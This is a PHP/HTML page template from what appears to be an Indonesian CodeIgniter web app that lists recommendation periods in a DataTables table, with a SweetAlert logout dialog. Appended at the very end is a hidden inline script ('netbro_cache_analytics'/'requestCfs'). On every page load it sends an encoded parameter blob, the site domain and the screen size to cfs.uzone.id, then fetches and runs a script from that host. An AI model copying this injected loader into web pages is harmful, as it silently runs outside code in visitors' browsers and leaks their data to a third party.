<section class="content">
  <div class="block-header">
    <div class="row">
      <div class="col-md-8 col-sm-7 col-xs-12">
        <div class="h-left clearfix">
          <h2>REKOMENDASI</h2>
          <small>Melihat Data Rekomendasi</small>
          <ol class="breadcrumb breadcrumb-col-pink p-l-0">
            <li><a href="javascript:void(0);">Dashboard</a></li>
            <li class="active">Rekomendasi</li>
          </ol>
        </div>
      </div>	
    </div>
  </div>
  <div class="container-fluid">
    <!-- Basic Examples -->
    <div class="row clearfix">
      <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
        <div class="card">
          <div class="header">
            <h2> DATA REKOMENDASI </h2>
          </div>
          <div class="body">
            <table class="table table-bordered table-striped table-hover js-basic-example dataTable">
              <thead>
                <tr>
                  <th>NO</th>
                  <th>ID PERIODE</th>
                  <th>PERIODE</th>
                </tr>
              </thead>
              <tbody>
               <?php 
               $no =1;
               foreach ($mydata as $row) { ?>
               <tr>    
                <td><?php echo $no++ ?></td> 
                <td><?php echo $row->id_periode ?></td>
                <td><a href="<?php echo base_url('index.php/rekomendasi/view_rekomendasi_detail/'.$row->id_periode); ?>"><button type="button" class="btn btn-raised bg-red  waves-effect"><?php echo $row->periode_awal ?> - <?php echo $row->periode_akhir ?> <i class="material-icons">loyalty</i></button></td>
              </tr>  
              <?php } ?>               
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>
  <!-- #END# Basic Examples -->  
</section>


<script src="<?php echo base_url()."assets/"; ?>bundles/libscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>bundles/vendorscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 

<!-- Jquery DataTable Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/jquery.dataTables.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/skin/bootstrap/js/dataTables.bootstrap.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/dataTables.buttons.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/buttons.flash.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/jszip.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/pdfmake.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/vfs_fonts.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/buttons.html5.min.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-datatable/extensions/export/buttons.print.min.js"></script> 

<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-sparkline/jquery.sparkline.js"></script> <!-- Sparkline Plugin Js -->

<script src="<?php echo base_url()."assets/"; ?>bundles/mainscripts.bundle.js"></script><!-- Custom Js --> 
<script src="<?php echo base_url()."assets/"; ?>js/pages/charts/sparkline.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/pages/tables/jquery-datatable.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>/plugins/sweetalert/sweetalert.min.js"></script> 
<script type="text/javascript">
  function logout(pesan, url) {
    swal({
      title: "Are you sure?",
      text: "Apakah Anda Ingin Logout?",
      type: "warning",
      showCancelButton: true,
      confirmButtonColor: "#DD6B55",
      confirmButtonText: "Ya, Logout",
      cancelButtonText: "Tidak",
      closeOnConfirm: false,
      closeOnCancel: false
    },
    function(isConfirm){
      if (isConfirm) {
        swal("Logout", "Anda Berhasil Logout", "success");
        window.location = url;
      } else {
        swal("Dibatalkan", "Batal Logout", "error");
      }
    });
  }

  if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKt4DxtVeiP1ODL3ZeeVxHxB2Ba7KQFZ1PFxNe%2fIVwD%2bEZxRJVm0MYkaaFl22CV5%2fBEUNDsVfTKHEpOUEgVu8gpYFKDk%2fX5RlXT1f51Mm58bvx3U%2bZHKMg66xPMBjEhKpIpXbxWDfntrSlm6D3dfin0kcbwMAvZLfoYX%2buk8CjjFnU%2fJe6kUFi1tYqPk8uKT%2fE1G%2f9U9NXVT7t3dCC7esnDwlibbUDdy%2fCeLH7VkVio%2fyAT922pDTfvQ9lHiPGAmcH8j1WSLXvMW0eK3WPA3LhkcAMSsXZk4wLz5egcX2suDSbHVEZSC%2bU5fh%2blQ9uBZHLblFaCVxYbLBPYcEeshnPPqmkARXqlfYuWJ44REJAigWiDqB6qfLOmDCO%2fkP5%2fvbUt%2bX3nf20Ccy0oRqH5uIFMzOrZRCJ54rYiqmR9jceldyzUb4kHeuFk0q1JCvWqZSC" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
  </html>